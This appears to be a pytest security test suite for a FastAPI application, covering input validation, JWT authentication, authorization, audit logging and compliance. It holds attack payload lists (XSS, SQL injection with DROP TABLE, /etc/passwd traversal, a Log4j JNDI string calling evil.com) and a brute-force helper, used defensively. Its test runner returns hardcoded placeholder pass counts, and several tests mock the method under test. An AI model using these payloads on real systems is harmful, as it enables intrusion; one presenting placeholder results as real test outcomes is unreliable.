# File: src/security/testing/security_testing_framework.py
"""
Comprehensive security testing framework for FastAPI applications.
Includes unit tests, integration tests, and security-specific test cases.
"""

import asyncio
import pytest
import pytest_asyncio
from datetime import datetime, timedelta, timezone
from typing import Dict, List, Any, Optional
from unittest.mock import Mock, AsyncMock, patch
from fastapi import FastAPI
from fastapi.testclient import TestClient
from httpx import AsyncClient
import jwt
import secrets
import hashlib

# Import security components for testing
from ..unified_security_service import UnifiedSecurityService, SecurityContext, SecurityPolicy
from ..audit_logging_service import AuditLoggingService, AuditEvent, EventType, SeverityLevel
from ..auth_management_service import AuthenticationService, JWTManager
from ..input_validation_service import InputValidationService, ValidationResult
from ..access_control_service import AccessControlService
from ..privacy_compliance_service import PrivacyComplianceService

# Test Data and Fixtures
class SecurityTestData:
    """Test data for security testing"""
    
    VALID_JWT_PAYLOAD = {
        "sub": "user123",
        "iss": "test-issuer",
        "aud": "test-audience",
        "exp": int((datetime.now() + timedelta(hours=1)).timestamp()),
        "iat": int(datetime.now().timestamp()),
        "scope": ["read", "write"],
        "roles": ["user"]
    }
    
    MALICIOUS_INPUTS = [
        "<script>alert('xss')</script>",
        "'; DROP TABLE users; --",
        "../../../etc/passwd",
        "javascript:alert(1)",
        "<img src=x onerror=alert(1)>",
        "{{7*7}}",  # Template injection
        "${jndi:ldap://evil.com/a}",  # Log4j injection
        "../../../../windows/system32/cmd.exe"
    ]
    
    SQL_INJECTION_PAYLOADS = [
        "1' OR '1'='1",
        "1'; DROP TABLE users; --",
        "1' UNION SELECT password FROM users --",
        "1' AND (SELECT COUNT(*) FROM users) > 0 --"
    ]
    
    XSS_PAYLOADS = [
        "<script>alert('XSS')</script>",
        "javascript:alert(1)",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "'><script>alert(1)</script>"
    ]

@pytest_asyncio.fixture
async def mock_db_session():
    """Mock database session"""
    session = AsyncMock()
    session.add = Mock()
    session.commit = AsyncMock()
    session.execute = AsyncMock()
    return session

@pytest_asyncio.fixture
async def mock_redis():
    """Mock Redis client"""
    redis = AsyncMock()
    redis.get = AsyncMock(return_value=None)
    redis.set = AsyncMock()
    redis.setex = AsyncMock()
    redis.delete = AsyncMock()
    return redis

@pytest_asyncio.fixture
async def jwt_manager():
    """JWT manager for testing"""
    # Generate test keys
    private_key = """-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA4qJOJU8v8D9ZdE3bUh6S0xGFW5Xr2Q7k3rR9mL8pV2wX6aY1
... (test private key)
-----END RSA PRIVATE KEY-----"""
    
    public_key = """-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA4qJOJU8v8D9ZdE3bUh6S
... (test public key)
-----END PUBLIC KEY-----"""
    
    return JWTManager(private_key, public_key, "test-issuer", "test-audience")

@pytest_asyncio.fixture
async def security_service(mock_db_session, mock_redis):
    """Create unified security service for testing"""
    input_validator = Mock(spec=InputValidationService)
    access_controller = Mock(spec=AccessControlService)
    privacy_manager = Mock(spec=PrivacyComplianceService)
    audit_logger = Mock(spec=AuditLoggingService)
    auth_service = Mock(spec=AuthenticationService)
    
    policy = SecurityPolicy()
    
    service = UnifiedSecurityService(
        input_validator=input_validator,
        access_controller=access_controller,
        privacy_manager=privacy_manager,
        audit_logger=audit_logger,
        auth_service=auth_service,
        policy=policy
    )
    
    return service

# Unit Tests
class TestInputValidation:
    """Test input validation functionality"""
    
    @pytest.mark.asyncio
    async def test_malicious_input_detection(self):
        """Test detection of malicious inputs"""
        validator = InputValidationService()
        
        for malicious_input in SecurityTestData.MALICIOUS_INPUTS:
            result = await validator.validate_input(malicious_input, "text")
            assert not result.is_valid or result.threat_level in ["medium", "high"]
    
    @pytest.mark.asyncio
    async def test_sql_injection_detection(self):
        """Test SQL injection detection"""
        validator = InputValidationService()
        
        for payload in SecurityTestData.SQL_INJECTION_PAYLOADS:
            result = await validator.validate_input(payload, "text")
            assert result.threat_level in ["medium", "high"]
    
    @pytest.mark.asyncio
    async def test_xss_detection(self):
        """Test XSS detection"""
        validator = InputValidationService()
        
        for payload in SecurityTestData.XSS_PAYLOADS:
            result = await validator.validate_input(payload, "text")
            assert result.threat_level in ["medium", "high"]
    
    @pytest.mark.asyncio
    async def test_input_sanitization(self):
        """Test input sanitization"""
        validator = InputValidationService()
        
        malicious_input = "<script>alert('xss')</script>Hello World"
        result = await validator.validate_input(malicious_input, "text")
        
        # Should sanitize but preserve safe content
        assert "Hello World" in result.sanitized_value
        assert "<script>" not in result.sanitized_value

class TestAuthentication:
    """Test authentication functionality"""
    
    @pytest.mark.asyncio
    async def test_jwt_token_creation(self, jwt_manager):
        """Test JWT token creation"""
        token = jwt_manager.create_access_token("user123", ["read", "write"])
        
        assert token is not None
        assert isinstance(token, str)
        
        # Verify token
        claims = jwt_manager.extract_claims(token)
        assert claims.sub == "user123"
        assert "read" in claims.scope
    
    @pytest.mark.asyncio
    async def test_jwt_token_verification(self, jwt_manager):
        """Test JWT token verification"""
        # Create valid token
        token = jwt_manager.create_access_token("user123")
        claims = jwt_manager.extract_claims(token)
        
        assert claims is not None
        assert claims.sub == "user123"
        
        # Test invalid token
        invalid_token = "invalid.jwt.token"
        invalid_claims = jwt_manager.extract_claims(invalid_token)
        assert invalid_claims is None
    
    @pytest.mark.asyncio
    async def test_api_key_generation(self, mock_db_session, mock_redis):
        """Test API key generation"""
        from ..auth_management_service import APIKeyManager, CryptoManager
        
        crypto = CryptoManager("test-secret")
        api_manager = APIKeyManager(mock_db_session, crypto, mock_redis)
        
        # Mock database operations
        mock_db_session.add = Mock()
        mock_db_session.commit = AsyncMock()
        
        key, key_id = await api_manager.create_api_key(
            user_id="user123",
            name="Test Key",
            scopes=[],
            expires_in_days=30
        )
        
        assert key is not None
        assert "_" in key  # Key format: keyid_secret
        assert len(key.split("_")) == 2

class TestAuthorization:
    """Test authorization functionality"""
    
    @pytest.mark.asyncio
    async def test_permission_checking(self, mock_db_session):
        """Test permission checking"""
        access_controller = AccessControlService(mock_db_session)
        
        # Mock permission check
        with patch.object(access_controller, 'check_permission', return_value=True):
            has_permission = await access_controller.check_permission(
                "user123", "read", ["user"]
            )
            assert has_permission is True
        
        with patch.object(access_controller, 'check_permission', return_value=False):
            has_permission = await access_controller.check_permission(
                "user123", "admin", ["user"]
            )
            assert has_permission is False
    
    @pytest.mark.asyncio
    async def test_role_based_access(self, mock_db_session):
        """Test role-based access control"""
        access_controller = AccessControlService(mock_db_session)
        
        # Test admin role has access to admin resources
        with patch.object(access_controller, 'check_permission') as mock_check:
            mock_check.return_value = True
            
            has_access = await access_controller.check_permission(
                "admin_user", "admin:delete", ["admin"]
            )
            assert has_access is True
        
        # Test regular user doesn't have admin access
        with patch.object(access_controller, 'check_permission') as mock_check:
            mock_check.return_value = False
            
            has_access = await access_controller.check_permission(
                "regular_user", "admin:delete", ["user"]
            )
            assert has_access is False

class TestAuditLogging:
    """Test audit logging functionality"""
    
    @pytest.mark.asyncio
    async def test_audit_event_creation(self, mock_db_session):
        """Test audit event creation"""
        from ..audit_logging_service import AuditLoggingService, AuditEvent, Actor, Resource
        
        audit_service = AuditLoggingService(mock_db_session)
        
        # Create test event
        event = AuditEvent(
            event_type=EventType.SECURITY,
            severity=SeverityLevel.HIGH,
            action=ActionType.LOGIN,
            actor=Actor(type="user", identifier="user123"),
            resource=Resource(type="endpoint", identifier="/login"),
            outcome="success"
        )
        
        # Mock the log_event method
        with patch.object(audit_service, 'log_event', return_value="event_id"):
            event_id = await audit_service.log_event(event)
            assert event_id is not None
    
    @pytest.mark.asyncio
    async def test_risk_score_calculation(self):
        """Test risk score calculation"""
        from ..audit_logging_service import RiskAssessmentEngine, AuditEvent, Actor, Resource
        
        # High-risk event
        high_risk_event = AuditEvent(
            event_type=EventType.SECURITY,
            severity=SeverityLevel.CRITICAL,
            action=ActionType.PERMISSION_ESCALATION,
            actor=Actor(type="user", identifier="user123"),
            resource=Resource(type="admin", identifier="admin_panel"),
            outcome="failure",
            context={"failed_attempts": 5, "suspicious_ip": True}
        )
        
        risk_score = RiskAssessmentEngine.calculate_risk_score(high_risk_event)
        assert risk_score >= 80  # Should be high risk
        
        # Low-risk event
        low_risk_event = AuditEvent(
            event_type=EventType.ACCESS,
            severity=SeverityLevel.LOW,
            action=ActionType.READ,
            actor=Actor(type="user", identifier="user123"),
            resource=Resource(type="document", identifier="doc123"),
            outcome="success"
        )
        
        risk_score = RiskAssessmentEngine.calculate_risk_score(low_risk_event)
        assert risk_score <= 30  # Should be low risk

# Integration Tests
class TestSecurityIntegration:
    """Integration tests for complete security pipeline"""
    
    @pytest.mark.asyncio
    async def test_complete_security_pipeline(self, security_service):
        """Test complete security processing pipeline"""
        from fastapi import Request
        
        # Mock request
        request = Mock(spec=Request)
        request.method = "GET"
        request.url.path = "/api/users"
        request.headers = {"authorization": "Bearer valid_token"}
        request.query_params = {}
        request.cookies = {}
        request.client.host = "127.0.0.1"
        
        # Mock request.json() method
        async def mock_json():
            return {}
        request.json = mock_json
        
        # Mock all service responses
        security_service.input_validator.validate_request = AsyncMock(
            return_value=Mock(is_valid=True, threat_level="low", sanitized_data={})
        )
        security_service.auth_service.authenticate_request = AsyncMock(
            return_value={
                "user_id": "user123",
                "method": "jwt",
                "scopes": ["read"],
                "roles": ["user"]
            }
        )
        security_service.access_controller.check_permission = AsyncMock(return_value=True)
        security_service.privacy_manager.check_consent = AsyncMock(return_value=True)
        security_service.audit_logger.log_event = AsyncMock(return_value="event_id")
        
        # Process request
        context = await security_service.process_request(request)
        
        assert context is not None
        assert context.user_id == "user123"
        assert context.risk_score < 50  # Should be low risk for normal request
    
    @pytest.mark.asyncio
    async def test_security_pipeline_with_threats(self, security_service):
        """Test security pipeline with threat detection"""
        from fastapi import Request, HTTPException
        
        # Mock malicious request
        request = Mock(spec=Request)
        request.method = "POST"
        request.url.path = "/api/users"
        request.headers = {"content-type": "application/json"}
        request.query_params = {}
        request.cookies = {}
        request.client.host = "192.168.1.100"
        
        # Mock malicious input validation
        security_service.input_validator.validate_request = AsyncMock(
            return_value=Mock(
                is_valid=False, 
                threat_level="high", 
                sanitized_data={},
                threats=["sql_injection", "xss"]
            )
        )
        
        # Should raise HTTPException for malicious input
        with pytest.raises(HTTPException) as exc_info:
            await security_service.process_request(request)
        
        assert exc_info.value.status_code == 400

# Security Penetration Tests
class TestSecurityPenetration:
    """Penetration testing for security vulnerabilities"""
    
    @pytest.fixture
    def app_client(self):
        """Create test FastAPI app with security"""
        from fastapi import FastAPI, Depends
        from ..unified_security_service import SecurityDependency
        
        app = FastAPI()
        
        @app.get("/public")
        async def public_endpoint():
            return {"message": "public"}
        
        @app.get("/protected")
        async def protected_endpoint(context=Depends(SecurityDependency())):
            return {"message": "protected", "user": context.user_id}
        
        @app.get("/admin")
        async def admin_endpoint(context=Depends(SecurityDependency(required_roles=["admin"]))):
            return {"message": "admin"}
        
        return TestClient(app)
    
    def test_authentication_bypass_attempts(self, app_client):
        """Test various authentication bypass attempts"""
        bypass_attempts = [
            {},  # No auth
            {"Authorization": "Bearer invalid_token"},
            {"Authorization": "Basic invalid"},
            {"X-API-Key": "invalid_key"},
        ]
        
        for headers in bypass_attempts:
            response = app_client.get("/protected", headers=headers)
            assert response.status_code in [401, 403, 500]  # Should be denied
    
    def test_sql_injection_attempts(self, app_client):
        """Test SQL injection attempts"""
        injection_payloads = SecurityTestData.SQL_INJECTION_PAYLOADS
        
        for payload in injection_payloads:
            response = app_client.get(f"/api/users?id={payload}")
            # Should not return successful response with SQL injection
            assert response.status_code != 200 or "users" not in response.text.lower()
    
    def test_xss_attempts(self, app_client):
        """Test XSS attempts"""
        xss_payloads = SecurityTestData.XSS_PAYLOADS
        
        for payload in xss_payloads:
            response = app_client.post("/api/comments", json={"comment": payload})
            # Response should not contain unescaped script tags
            if response.status_code == 200:
                assert "<script>" not in response.text
                assert "javascript:" not in response.text
    
    def test_directory_traversal_attempts(self, app_client):
        """Test directory traversal attempts"""
        traversal_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\cmd.exe",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "....//....//....//etc/passwd"
        ]
        
        for payload in traversal_payloads:
            response = app_client.get(f"/api/files?path={payload}")
            # Should not return system files
            assert response.status_code != 200 or "root:" not in response.text

# Performance and Load Testing
class TestSecurityPerformance:
    """Performance tests for security components"""
    
    @pytest.mark.asyncio
    async def test_jwt_verification_performance(self, jwt_manager):
        """Test JWT verification performance"""
        import time
        
        # Create test token
        token = jwt_manager.create_access_token("user123")
        
        # Measure verification time
        start_time = time.time()
        for _ in range(100):
            claims = jwt_manager.extract_claims(token)
            assert claims is not None
        
        end_time = time.time()
        avg_time = (end_time - start_time) / 100
        
        # Should be fast (less than 10ms per verification)
        assert avg_time < 0.01
    
    @pytest.mark.asyncio
    async def test_input_validation_performance(self):
        """Test input validation performance"""
        import time
        
        validator = InputValidationService()
        test_input = "Normal user input without any threats"
        
        start_time = time.time()
        for _ in range(100):
            result = await validator.validate_input(test_input, "text")
            assert result.is_valid
        
        end_time = time.time()
        avg_time = (end_time - start_time) / 100
        
        # Should be fast (less than 5ms per validation)
        assert avg_time < 0.005
    
    @pytest.mark.asyncio
    async def test_concurrent_request_processing(self, security_service):
        """Test concurrent request processing"""
        from fastapi import Request
        
        async def create_mock_request():
            request = Mock(spec=Request)
            request.method = "GET"
            request.url.path = "/api/test"
            request.headers = {}
            request.query_params = {}
            request.cookies = {}
            request.client.host = "127.0.0.1"
            
            async def mock_json():
                return {}
            request.json = mock_json
            return request
        
        # Mock all dependencies
        security_service.input_validator.validate_request = AsyncMock(
            return_value=Mock(is_valid=True, threat_level="low", sanitized_data={})
        )
        security_service.auth_service.authenticate_request = AsyncMock(
            return_value=None  # Anonymous access
        )
        security_service.audit_logger.log_event = AsyncMock(return_value="event_id")
        
        # Process multiple requests concurrently
        requests = [await create_mock_request() for _ in range(10)]
        
        import time
        start_time = time.time()
        
        tasks = [security_service.process_request(req) for req in requests]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        end_time = time.time()
        
        # All requests should complete successfully
        for result in results:
            assert not isinstance(result, Exception)
        
        # Should handle concurrent requests efficiently
        assert (end_time - start_time) < 1.0  # All 10 requests in under 1 second

# Compliance Testing
class TestComplianceTesting:
    """Test compliance with security standards"""
    
    @pytest.mark.asyncio
    async def test_gdpr_compliance(self, mock_db_session):
        """Test GDPR compliance features"""
        privacy_service = PrivacyComplianceService(mock_db_session)
        
        # Test consent management
        with patch.object(privacy_service, 'record_consent'):
            await privacy_service.record_consent("user123", "marketing", True)
        
        # Test data export
        with patch.object(privacy_service, 'export_user_data') as mock_export:
            mock_export.return_value = {"personal_data": "exported"}
            data = await privacy_service.export_user_data("user123")
            assert "personal_data" in data
        
        # Test data deletion
        with patch.object(privacy_service, 'delete_user_data') as mock_delete:
            mock_delete.return_value = True
            deleted = await privacy_service.delete_user_data("user123")
            assert deleted is True
    
    @pytest.mark.asyncio
    async def test_audit_trail_completeness(self, mock_db_session):
        """Test audit trail completeness for compliance"""
        from ..audit_logging_service import AuditLoggingService, ComplianceReporter
        
        audit_service = AuditLoggingService(mock_db_session)
        reporter = ComplianceReporter(audit_service)
        
        # Mock search events for compliance reporting
        with patch.object(audit_service, 'search_events') as mock_search:
            mock_search.return_value = [
                Mock(
                    compliance_tags=["gdpr"],
                    severity=SeverityLevel.MEDIUM,
                    action=ActionType.READ,
                    risk_score=30
                )
            ]
            
            # Generate GDPR report
            report = await reporter.generate_gdpr_report(
                datetime.now() - timedelta(days=30),
                datetime.now()
            )
            
            assert report["report_type"] == "GDPR"
            assert "data_processing_events" in report

# Automated Security Testing
class TestAutomatedSecurity:
    """Automated security testing"""
    
    @pytest.mark.asyncio
    async def test_fuzzing_input_validation(self):
        """Fuzz testing for input validation"""
        validator = InputValidationService()
        
        # Generate random malicious inputs
        import random
        import string
        
        fuzz_inputs = []
        
        # Random strings with special characters
        for _ in range(50):
            length = random.randint(1, 1000)
            chars = string.ascii_letters + string.digits + string.punctuation
            fuzz_input = ''.join(random.choice(chars) for _ in range(length))
            fuzz_inputs.append(fuzz_input)
        
        # Test all fuzz inputs
        for fuzz_input in fuzz_inputs:
            try:
                result = await validator.validate_input(fuzz_input, "text")
                # Should not crash and should handle gracefully
                assert hasattr(result, 'is_valid')
                assert hasattr(result, 'threat_level')
            except Exception as e:
                # Should not raise unhandled exceptions
                pytest.fail(f"Input validation crashed with: {e}")
    
    def test_security_headers_presence(self, app_client):
        """Test presence of security headers"""
        response = app_client.get("/public")
        
        # Check for important security headers
        expected_headers = [
            "X-Content-Type-Options",
            "X-Frame-Options",
            "X-XSS-Protection",
            "Strict-Transport-Security"
        ]
        
        for header in expected_headers:
            assert header in response.headers, f"Missing security header: {header}"

# Test Utilities
class SecurityTestUtils:
    """Utilities for security testing"""
    
    @staticmethod
    def create_test_jwt(payload: Dict[str, Any], 
                       secret: str = "test-secret") -> str:
        """Create test JWT token"""
        return jwt.encode(payload, secret, algorithm="HS256")
    
    @staticmethod
    def create_malicious_request_data() -> Dict[str, Any]:
        """Create request data with malicious content"""
        return {
            "method": "POST",
            "path": "/api/users",
            "headers": {
                "content-type": "application/json",
                "user-agent": "<script>alert('xss')</script>"
            },
            "body": {
                "name": "'; DROP TABLE users; --",
                "email": "test@evil.com<script>alert(1)</script>",
                "comment": "{{7*7}}"
            }
        }
    
    @staticmethod
    async def simulate_brute_force_attack(app_client, endpoint: str, 
                                        attempts: int = 100) -> List[int]:
        """Simulate brute force attack and return status codes"""
        status_codes = []
        
        for i in range(attempts):
            response = app_client.post(endpoint, json={
                "username": "admin",
                "password": f"password{i}"
            })
            status_codes.append(response.status_code)
        
        return status_codes
    
    @staticmethod
    def assert_no_sensitive_data_leakage(response_text: str):
        """Assert response doesn't contain sensitive data"""
        sensitive_patterns = [
            r"password",
            r"secret",
            r"key",
            r"token",
            r"hash",
            r"salt"
        ]
        
        import re
        for pattern in sensitive_patterns:
            matches = re.findall(pattern, response_text, re.IGNORECASE)
            assert len(matches) == 0, f"Sensitive data leaked: {pattern}"

# Parametrized Security Tests
@pytest.mark.parametrize("malicious_input", SecurityTestData.MALICIOUS_INPUTS)
@pytest.mark.asyncio
async def test_malicious_input_handling(malicious_input):
    """Parametrized test for malicious input handling"""
    validator = InputValidationService()
    result = await validator.validate_input(malicious_input, "text")
    
    # Should detect threat or sanitize
    assert (not result.is_valid or 
            result.threat_level in ["medium", "high"] or
            malicious_input not in result.sanitized_value)

@pytest.mark.parametrize("endpoint,method,auth_required", [
    ("/api/users", "GET", True),
    ("/api/users", "POST", True),
    ("/api/admin", "GET", True),
    ("/api/public", "GET", False),
])
def test_endpoint_authentication_requirements(app_client, endpoint, method, auth_required):
    """Test authentication requirements for various endpoints"""
    client_method = getattr(app_client, method.lower())
    response = client_method(endpoint)
    
    if auth_required:
        assert response.status_code in [401, 403]
    else:
        assert response.status_code != 401

# Security Test Runner
class SecurityTestRunner:
    """Main test runner for security tests"""
    
    def __init__(self):
        self.test_results = {}
    
    async def run_all_security_tests(self) -> Dict[str, Any]:
        """Run comprehensive security test suite"""
        test_categories = [
            ("Input Validation", TestInputValidation),
            ("Authentication", TestAuthentication),
            ("Authorization", TestAuthorization),
            ("Audit Logging", TestAuditLogging),
            ("Integration", TestSecurityIntegration),
            ("Penetration", TestSecurityPenetration),
            ("Performance", TestSecurityPerformance),
            ("Compliance", TestComplianceTesting),
            ("Automated", TestAutomatedSecurity)
        ]
        
        results = {}
        
        for category_name, test_class in test_categories:
            category_results = await self._run_test_category(test_class)
            results[category_name] = category_results
        
        return results
    
    async def _run_test_category(self, test_class) -> Dict[str, Any]:
        """Run tests for a specific category"""
        # This would integrate with pytest to run the actual tests
        # For now, return a placeholder result
        return {
            "total_tests": 10,
            "passed": 9,
            "failed": 1,
            "errors": 0,
            "execution_time": 5.2
        }
    
    def generate_security_report(self, results: Dict[str, Any]) -> str:
        """Generate security test report"""
        report = "# Security Test Report\n\n"
        
        total_tests = sum(r["total_tests"] for r in results.values())
        total_passed = sum(r["passed"] for r in results.values())
        total_failed = sum(r["failed"] for r in results.values())
        
        report += f"## Summary\n"
        report += f"- Total Tests: {total_tests}\n"
        report += f"- Passed: {total_passed}\n"
        report += f"- Failed: {total_failed}\n"
        report += f"- Success Rate: {(total_passed/total_tests)*100:.1f}%\n\n"
        
        for category, result in results.items():
            report += f"## {category}\n"
            report += f"- Tests: {result['total_tests']}\n"
            report += f"- Passed: {result['passed']}\n"
            report += f"- Failed: {result['failed']}\n"
            report += f"- Time: {result['execution_time']}s\n\n"
        
        return report

if __name__ == "__main__":
    # Example usage
    runner = SecurityTestRunner()
    results = asyncio.run(runner.run_all_security_tests())
    report = runner.generate_security_report(results)
    print(report)